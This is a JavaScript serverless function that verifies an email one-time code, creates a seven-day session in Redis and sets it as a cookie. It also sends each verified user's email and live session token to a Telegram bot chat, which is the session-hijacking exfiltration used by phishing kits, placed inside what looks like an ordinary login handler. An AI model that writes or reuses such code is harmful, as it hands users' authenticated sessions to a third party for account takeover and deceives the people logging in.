const Redis = require("ioredis");
const { v4: uuidv4 } = require("uuid");
const fetch = require("node-fetch");

const REDIS_URL = process.env.REDIS_URL;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!REDIS_URL || !BOT_TOKEN || !CHAT_ID) {
  throw new Error("Missing required environment variables.");
}

const redis = new Redis(REDIS_URL);

function getOtpKey(email) {
  return `otp:${email}`;
}

function getSessionKey(token) {
  return `session:${token}`;
}

const SESSION_TTL_SECONDS = 60 * 60 * 24 * 7; // 7 days

exports.handler = async function (event) {
  try {
    if (event.httpMethod !== "POST") {
      return {
        statusCode: 405,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "Method not allowed" }),
      };
    }

    let email, otp;
    try {
      ({ email, otp } = JSON.parse(event.body));
    } catch {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "Invalid JSON body" }),
      };
    }

    if (!email || !otp) {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "Missing email or OTP" }),
      };
    }

    email = email.trim().toLowerCase();

    const storedOtp = await redis.get(getOtpKey(email));
    if (!storedOtp) {
      return {
        statusCode: 400,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "OTP not found" }),
      };
    }

    if (storedOtp !== otp) {
      return {
        statusCode: 401,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ success: false, message: "Invalid OTP" }),
      };
    }

    // Session creation
    const sessionToken = uuidv4();
    await redis.set(getSessionKey(sessionToken), email, "EX", SESSION_TTL_SECONDS);

    // Send session/cookie to Telegram
    const message =
      `✅ *OTP Verified*\n\n` +
      `📧 Email: ${email}\n` +
      `🍪 Session: ${sessionToken}\n` +
      `⏳ Valid for: 7 days`;

    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
      await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
    } catch (e) {
      // continue, but log error
      console.error("Telegram session notify failed: ", e);
    }

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/json",
        "Set-Cookie": `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict`,
      },
      body: JSON.stringify({ success: true, message: "OTP verified and session created" }),
    };
  } catch (error) {
    console.error("verify-otp error:", error);
    return {
      statusCode: 500,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        success: false,
        message: "Server error",
        error: process.env.NODE_ENV === "production" ? undefined : error.message,
      }),
    };
  }
};